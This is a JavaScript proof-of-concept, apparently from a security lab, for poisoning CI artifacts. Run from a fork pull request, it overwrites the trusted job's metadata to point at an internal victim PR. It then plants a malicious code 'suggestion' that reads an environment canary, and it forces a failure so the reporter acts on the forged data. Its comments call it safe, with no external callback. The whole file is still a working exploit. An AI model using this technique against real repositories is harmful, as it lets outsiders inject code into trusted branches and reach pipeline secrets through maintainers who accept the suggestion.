// ATTACKER payload. In PR A (from your FORK), replace scripts/format-step.js with
// THIS file. When the Format job runs on your fork PR, this executes (PR head code)
// and overwrites the artifact so it (1) names the INTERNAL victim PR B and (2) carries
// a malicious "suggestion" that reads the canary.
//
// ---- EDIT THESE TWO BEFORE PUSHING PR A ----
const VICTIM_PR_NUMBER = '1';                 // e.g. '2'
const VICTIM_HEAD_SHA  = '79ab2b112b9fe44bc9f63561bac5d3cb5be521c9';        // git rev-parse of PR B head
// --------------------------------------------
'use strict';
const fs = require('fs');
fs.mkdirSync('.format-results', {recursive: true});

// (1) Point the artifact at the victim PR (trusted step wrote OUR number; we overwrite).
fs.writeFileSync('.format-results/metadata.json', JSON.stringify({
  EVENT_NAME: 'pull_request',
  PR_NUMBER: VICTIM_PR_NUMBER,
  HEAD_SHA: VICTIM_HEAD_SHA,
}));

// (2) Malicious suggestion body committed to PR B's scripts/ci-target.js line 2 when a
// maintainer clicks "Commit suggestion". Safe canary proof: writes SHA-256 of the
// canary to a LOCAL artifact. No external callback, no secret disclosure.
const MALICIOUS_LINE =
  'const crypto=require(\'crypto\');require(\'fs\').writeFileSync(\'canary-proof.txt\',\'LAB_CANARY_sha256=\'+crypto.createHash(\'sha256\').update(process.env.LAB_CANARY||\'\').digest(\'hex\'));const mode="default";';

// Unified diff targeting scripts/ci-target.js line 2 (must match PR B's changed line).
const patch = [
  'diff --git a/scripts/ci-target.js b/scripts/ci-target.js',
  '--- a/scripts/ci-target.js',
  '+++ b/scripts/ci-target.js',
  '@@ -4,1 +4,1 @@',
  '-const mode = "testing";',
  '+' + MALICIOUS_LINE,
  '',
].join('\n');
fs.writeFileSync('.format-results/format.patch', patch);
fs.writeFileSync('.format-results/output.txt', 'lab');

// (3) Force the Format run to conclude "failure" so the reporter proceeds.
process.exit(1);
